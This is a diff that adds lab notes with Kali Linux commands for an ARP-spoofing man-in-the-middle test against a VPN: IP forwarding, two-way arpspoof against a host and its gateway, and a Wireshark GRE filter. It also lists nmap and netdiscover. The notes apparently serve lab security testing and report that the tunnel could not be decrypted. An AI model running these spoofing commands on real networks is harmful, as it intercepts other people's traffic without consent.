@@ -1,0 +1,28 @@
+Kali Linux – MITM Testing Commands for VPN Lab
+
+1. Set static IP:
+   sudo ip addr add 192.168.10.20/24 dev eth0
+   sudo ip route add default via 192.168.10.1 dev eth0
+
+2. Enable IP forwarding:
+   echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+3. MITM (Man-in-the-middle) attack using arpspoof:
+   Terminal 1:
+   sudo arpspoof -i eth0 -t 192.168.10.10 192.168.10.1
+   Terminal 2:
+   sudo arpspoof -i eth0 -t 192.168.10.1 192.168.10.10
+
+4. Start Wireshark:
+   sudo wireshark
+
+   - Filter used:
+     ip.proto == 47
+
+   - Observed GRE packets (VPN traffic), PPP compression
+
+5. Verified VPN tunnel cannot be decrypted by attacker
+
+Optional Tools:
+- nmap – Port scanning
+- netdiscover – Network scanning
